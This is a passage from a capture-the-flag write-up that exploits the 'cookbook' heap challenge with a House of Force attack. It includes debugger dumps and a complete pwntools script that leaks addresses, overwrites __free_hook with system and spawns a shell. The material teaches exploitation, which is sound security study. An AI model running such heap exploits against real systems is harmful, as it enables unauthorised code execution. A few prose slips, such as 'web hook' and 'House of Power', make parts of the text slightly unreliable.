$esp   : 0xffffd06c  →  0xf7e6fe5a  →  <free+154> add esp, 0x10
$ebp   : 0xffffd0a8  →  0xffffd168  →  0xffffd178  →  0x00000000
$esi   : 0x1       
$edi   : 0xf7fb3000  →  0x001b5db0
$eip   : 0x30303030 ("0000"?)
$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffd06c│+0x0000: 0xf7e6fe5a  →  <free+154> add esp, 0x10  ← $esp
0xffffd070│+0x0004: 0x0804f2b0  →  "15935728"
0xffffd074│+0x0008: 0x08048b62  →   add esp, 0x10
0xffffd078│+0x000c: 0xf7fb487c  →  0x00000000
0xffffd07c│+0x0010: 0xf7e6fdc0  →  <free+0> push ebx
0xffffd080│+0x0014: 0x0804f2b0  →  "15935728"
0xffffd084│+0x0018: 0xf7e6fdc6  →  <free+6> add ebx, 0x14323a
0xffffd088│+0x001c: 0xffffd190  →  0x00000001
─────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x30303030
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────
0x30303030 in ?? ()
gef➤  
```

So we can see that it did try to execute the value of the web hook, 0000. Later on, we can just compare the address of free to the address of the free hook to get the offset, which is 0x144af0. Now let's execute the House of Force attack.

#### House of Force - Write over Wilderness Value

First let's talk about the heap wilderness. The wilderness is essentially memory that the program has mapped for the heap, but malloc hasn't yet allocated. Right at the beginning of the wilderness, is something called the wilderness value. This essentially keeps track of the size of the wilderness. That way when malloc tries to allocate space from the wilderness, it can just check this value to see if there is enough space left. If there isn't, then it will expand the wilderness by mapping more space for the heap with `mmap`. The House of Force attack focuses on attacking the wilderness value.

Essentially what House of Force does is overwrite the wilderness value with a much larger value (in our case, it will be `0xffffffff`). Then we will try and allocate an insanely large chunk from the wilderness that will obviously go well beyond the end of the heap, and into other memory regions such as libc. However since the wilderness value is big enough, malloc will go ahead and allocate that chunk. Then we can use that chunk to overwrite things in memory regions other than the heap.

Also just for reference, in a sample x64 program this is an instance of a wilderness value at `0x555555756038`:

```
gef➤  x/20g $rax
0x555555756010: 0x0000000000000000  0x0000000000000000
0x555555756020: 0x0000000000000000  0x0000000000000000
0x555555756030: 0x0000000000000000  0x0000000000020fd1
0x555555756040: 0x0000000000000000  0x0000000000000000
0x555555756050: 0x0000000000000000  0x0000000000000000
0x555555756060: 0x0000000000000000  0x0000000000000000
0x555555756070: 0x0000000000000000  0x0000000000000000
0x555555756080: 0x0000000000000000  0x0000000000000000
0x555555756090: 0x0000000000000000  0x0000000000000000
0x5555557560a0: 0x0000000000000000  0x0000000000000000
gef➤  x/g 0x555555756038
0x555555756038: 0x0000000000020fd1
```


So let's figure out how to groom the heap to allow us to do it. Picking up from where we left off with the infoleaks and a few other things (from the perspective of the exploit), we will first get a stale pointer to work with:

```
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
UNKNOWN DIRECTIVE
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
$ c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
$ n
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
$ d
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
$ q
```

Next we will add two new ingredients, then free one. This will position it such that we can overwrite the wilderness value with the instructions:

```
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
$ a
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
$ n
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
$ n
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
$ d
```

When we take a look at the memory layout prior to the write:

```
gef➤  x/20wx 0x8d5f400
0x8d5f400:  0x00000000  0x00000000  0x00000000  0x08d5f380
0x8d5f410:  0x00000000  0x0001ebf1  0x00000000  0x00000000
0x8d5f420:  0x00000000  0x00000000  0x00000000  0x00000000
0x8d5f430:  0x00000000  0x00000000  0x00000000  0x00000000
0x8d5f440:  0x00000000  0x00000000  0x00000000  0x00000000
```

We can see the wilderness value at `0x8d5f410`, which is `0x0001ebf1`. Now let's overwrite it with instructions:

```
$ q
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
$ c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
$ i
$ 0000111122223333
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
```

When we look at the memory:

```
gef➤  x/20wx 0x8d5f400
0x8d5f400:  0x00000000  0x00000000  0x00000000  0x30303030
0x8d5f410:  0x31313131  0x32323232  0x33333333  0x0000000a
0x8d5f420:  0x00000000  0x00000000  0x00000000  0x00000000
0x8d5f430:  0x00000000  0x00000000  0x00000000  0x00000000
0x8d5f440:  0x00000000  0x00000000  0x00000000  0x00000000
```

Just like that, we were able to overwrite the wilderness value with `0x32323232`.

#### House of Power - Overwrite Free Hook

Now that we have the wilderness value overwritten, the next step is to allocate a chunk that spans outside of the heap into the libc. For this, we will actually allocate two chunks. The first will be the massive one that spans from the heap up to near the free hook. The purpose of this is to align the heap, so the next chunk we allocate will be right on the free hook.

For how much space we will allocate with the first chunk, we will allocate space equal to `freehookAddress - 16 - wildernessAddress` (we know those values thanks to the infoleaks). The reason for the `-16` is to make room for the heap metadata for the two chunks.

Let's take a look at the actual malloc allocations. First we will allocate a chunk of size `0xeec3c490` due to the memory mappings of this particular run:

```
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048bb2                  adc    BYTE PTR [ecx-0x137c4fbb], cl
    0x8048bb8                  or     al, 0xff
    0x8048bba                  jne    0x8048b6c
 →  0x8048bbc                  call   0x8048580 <malloc@plt>
   ↳   0x8048580 <malloc@plt+0>   jmp    DWORD PTR ds:0x804d02c
       0x8048586 <malloc@plt+6>   push   0x40
       0x804858b <malloc@plt+11>  jmp    0x80484f0
       0x8048590 <puts@plt+0>     jmp    DWORD PTR ds:0x804d030
       0x8048596 <puts@plt+6>     push   0x48
       0x804859b <puts@plt+11>    jmp    0x80484f0
─────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   [sp + 0x0] = 0xeec3c490,
   [sp + 0x4] = 0x00000000,
   [sp + 0x8] = 0x00000010,
   [sp + 0xc] = 0xf760288c → <fgets+156> add esp, 0x20
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048bbc → call 0x8048580 <malloc@plt>
[#1] 0x8048a71 → jmp 0x8048b42
[#2] 0x804a426 → call 0x8049bed
[#3] 0xf75bc276 → __libc_start_main()
[#4] 0x8048621 → hlt
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x08048bbc in ?? ()
```

We end up with this chunk:

```
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048bb6                  sub    esp, 0xc
    0x8048bb9                  push   DWORD PTR [ebp-0x50]
    0x8048bbc                  call   0x8048580 <malloc@plt>
 →  0x8048bc1                  add    esp, 0x10
    0x8048bc4                  mov    ds:0x804d0a8, eax
    0x8048bc9                  mov    ecx, DWORD PTR ds:0x804d080
    0x8048bcf                  mov    edx, DWORD PTR [ebp-0x50]
    0x8048bd2                  mov    eax, ds:0x804d0a8
    0x8048bd7                  sub    esp, 0x4
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048bc1 → add esp, 0x10
[#1] 0x8048a71 → jmp 0x8048b42
[#2] 0x804a426 → call 0x8049bed
[#3] 0xf75bc276 → __libc_start_main()
[#4] 0x8048621 → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08048bc1 in ?? ()
gef➤  p $eax
$1 = 0x8b1f418
```

Next up we allocate the chunk that should overlap with the free hook:

```
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048bb2                  adc    BYTE PTR [ecx-0x137c4fbb], cl
    0x8048bb8                  or     al, 0xff
    0x8048bba                  jne    0x8048b6c
 →  0x8048bbc                  call   0x8048580 <malloc@plt>
   ↳   0x8048580 <malloc@plt+0>   jmp    DWORD PTR ds:0x804d02c
       0x8048586 <malloc@plt+6>   push   0x40
       0x804858b <malloc@plt+11>  jmp    0x80484f0
       0x8048590 <puts@plt+0>     jmp    DWORD PTR ds:0x804d030
       0x8048596 <puts@plt+6>     push   0x48
       0x804859b <puts@plt+11>    jmp    0x80484f0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   [sp + 0x0] = 0x00000005,
   [sp + 0x4] = 0x00000000,
   [sp + 0x8] = 0x00000010,
   [sp + 0xc] = 0xf760288c → <fgets+156> add esp, 0x20
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048bbc → call 0x8048580 <malloc@plt>
[#1] 0x8048a71 → jmp 0x8048b42
[#2] 0x804a426 → call 0x8049bed
[#3] 0xf75bc276 → __libc_start_main()
[#4] 0x8048621 → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x08048bbc in ?? ()
gef➤  

. . .

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048bb6                  sub    esp, 0xc
    0x8048bb9                  push   DWORD PTR [ebp-0x50]
    0x8048bbc                  call   0x8048580 <malloc@plt>
 →  0x8048bc1                  add    esp, 0x10
    0x8048bc4                  mov    ds:0x804d0a8, eax
    0x8048bc9                  mov    ecx, DWORD PTR ds:0x804d080
    0x8048bcf                  mov    edx, DWORD PTR [ebp-0x50]
    0x8048bd2                  mov    eax, ds:0x804d0a8
    0x8048bd7                  sub    esp, 0x4
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048bc1 → add esp, 0x10
[#1] 0x8048a71 → jmp 0x8048b42
[#2] 0x804a426 → call 0x8049bed
[#3] 0xf75bc276 → __libc_start_main()
[#4] 0x8048621 → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08048bc1 in ?? ()
gef➤  p $eax
$3 = 0xf775b8b0
gef➤  x/wx $eax
0xf775b8b0: 0x00000000
gef➤  p __free_hook
$4 = 0x0
gef➤  set __free_hook = 0xfacade
gef➤  x/wx $eax
0xf775b8b0: 0x00facade
```

As you can see, we were able to allocate a chunk to the free hook by using a House of Force attack. After that, we just write the address of system to the free hook. After that, it is just a matter of freeing a chunk that points to `/bin/sh\x00`.

## Exploit

Putting it all together, we have the following exploit. This was ran on Ubuntu 17.04:

```
'''
This exploit is based off of this writeup with multiple parts (one of the best writeups I ever saw):
https://www.youtube.com/watch?v=f1wp6wza8ZI
https://www.youtube.com/watch?v=dnHuZLySS6g
https://www.youtube.com/watch?v=PISoSH8KGVI
link to exploit: https://gist.github.com/LiveOverflow/dadc75ec76a4638ab9ea#file-cookbook-py-L20
'''

#Import ctypes for signed to unsigned conversion, and pwntools to make life easier
import ctypes
from pwn import *

#Establish the got address for the free function, and an integer with value zero
gotFree = 0x804d018
zero = 0x0

#Establish the target
target = process('./cookbook', env={"LD_PRELOAD":"./libc-2.24.so"})
#gdb.attach(target)

#Send the initial name, guyinatuxedo
target.sendline('guyinatuxedo')

#This function will just reset the heap, by mallocing 5 byte size blocks with the string "00000" by giving the cookbook a name
def refresh_heap(amount):
    for i in range(0, amount):
        target.sendline("g")
        target.sendline(hex(0x5))
        target.sendline("00000")
        recv()
        recv()


#These are functions just to scan in output from the program
def recv():
    target.recvuntil("====================")

def recvc():
    target.recvuntil("[q]uit")

def recvd():
    target.recvuntil("------\n")

#This function will leak a heap address, and calculate the address of the wilderness
def leakHeapadr():
    #Create a new recipe, and add an ingredient
    target.sendline('c')
    recvc()
    target.sendline('n')
    recvc()
    target.sendline('a')
    recvc()
    target.sendline('water')
    target.sendline('0x1')

    #Delete the recipe to free it
    target.sendline('d')
    recvc()

    #Print the stale pointer, and parse out the heap infoleak
    target.sendline('p')
    target.recvuntil("recipe type: (null)\n\n")
    heapleak = target.recvline()
    heapleak = heapleak.replace(' -', '')
    heapleak = int(heapleak)

    #Calculate the address of the wilderness
    global wilderness
    wilderness = heapleak + 0xd38

    #Print the results
    log.info("Heap leak is: " + hex(heapleak))
    log.info("Wilderness is at: " + hex(wilderness))
    target.sendline('q')
    recv()
    recvc()

#This function will grab us a leak to libc, and calculate the address for system and the free hook
def leakLibcadr():
    #Add a new ingredient, give it a name, price, calories, then save and exit
    target.sendline('a')
    recv()
    target.sendline('n')
    recv()
    target.sendline('g')
    target.sendline('7539')
    recv()
    target.sendline('s')
    target.sendline('2')
    recv()
    target.sendline('p')
    target.sendline('1')
    recv()
    target.sendline('e')
    recv()
    target.sendline('q')
    recv()

    #Go into the create recipe menu, use the instructions write `i` to write over the ingredient with the got address of Free
    target.sendline('c')
    recvc()
    target.sendline('i')
    target.sendline('0'*12 + p32(gotFree) + p32(zero))
    recvc()
    target.sendline('q')
    recv()

    #Print the infoleak and parse it out
    target.sendline('l')
    recvc()
    for i in xrange(9):
        recvd()
    target.recvline()
    libcleak = target.recvline()
    libcleak = ctypes.c_uint32(int(libcleak.replace("calories: ", "")))
    libcleak = libcleak.value
    
    #Calculate the addresses for system and the freehook, print all three addresses
    global sysadr
    sysadr = libcleak - 0x37d60
    global freehook
    freehook = libcleak + 0x144af0
    log.info("Address of free: " + hex(libcleak))
    log.info("Address of system: " + hex(sysadr))
    log.info("Address of free hook: " + hex(freehook))

#This function will overwrite the value that specifies how much of the heap is left (overwriteWilderness) with 0xffffffff so we can use malloc/calloc to allocate space outside of the heap
def overwriteWilderness():

    #This will allow us to start with a fresh new heap, so it will make the next part easier
    refresh_heap(0x100)
    
    #Create a new stalepointer, which will be used later
    target.sendline('c')
    recvc()
    target.sendline('n')
    recvc()
    target.sendline('d')
    recvc()
    target.sendline('q')
    recv()

    #Add two new ingredients, then free one. This will position the wilderness value at a spot which we can easily write to it
    target.sendline('a')
    recv()
    target.sendline('n')
    recv()
    target.sendline('n')
    recv()
    target.sendline('d')
    recv()
    target.sendline('q')
    recv()

    #Write over the wilderness value which is 8 bytes away from the start of our input, with 0xffffffff
    target.sendline('c')
    recvc()
    target.sendline('i')
    recvc()
    wildernessWrite = p32(0x0) + p32(0x0) + p32(0xffffffff) + p32(0x0)
    target.sendline(wildernessWrite)
    recvc()
    target.sendline('q')
    recv()

def overwriteFreehook():

    #Calculate the space that we will need to allocate to get right before the free hook
    malloc_to_freehook = (freehook - 16) - wilderness
    log.info("Space from wilderness to freehook is : " + hex(malloc_to_freehook))

    #Allocate that much space by giving a cookbook a name of that size
    target.sendline('g')
    target.sendline(hex(malloc_to_freehook))
    target.sendline('0000')
    recv()

    #Now that the heap is aligned, the next name should write over the freehook, which we write over it with the address of system
    target.sendline('g')
    target.sendline(hex(5))
    target.sendline(p32(sysadr))
    recv()

    #Next we will allocate a new space in the heap, and store our argument to system in it
    target.sendline('g')
    target.sendline(hex(8))
    target.sendline("/bin/sh")
    recv()

    #Lastly we will run free from the space malloced in the last block, so we can run free with the system function as a hook, with an argument that is a pointer to "/bin/sh"
    target.sendline('R')
    recv()

    #Recieve some additional output that we didn't do earlier (unimportant for the exploit)
    recv()
    recv()
    recvc()

#Run the four functions that make up this exploit
leakHeapadr()
leakLibcadr()
overwriteWilderness()
overwriteFreehook()

#Drop to an interactive shell
log.info("XD Enjoy your shell XD")
target.interactive()
```

When we run it:
```
$ python exploit.py
[+] Starting local process './cookbook': pid 63919
[*] Heap leak is: 0x846d6d8
[*] Wilderness is at: 0x846e410
[*] Address of free: 0xf761fdc0
[*] Address of system: 0xf75e8060
[*] Address of free hook: 0xf77648b0
[*] Space from wilderness to freehook is : 0xef2f6490
[*] XD Enjoy your shell XD
[*] Switching to interactive mode

ERROR: ld.so: object './libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
ERROR: ld.so: object './libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
$ w
ERROR: ld.so: object './libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
 01:13:59 up  2:55,  1 user,  load average: 0.00, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               21Aug19  9days 58.15s  0.03s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
ERROR: ld.so: object './libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
cookbook    libc-2.24.so           peda-session-w.procps.txt  try.py
core        peda-session-cookbook.txt  readme.md
exploit.py  peda-session-dash.txt      test.py
```

Like that, we popped a shell!
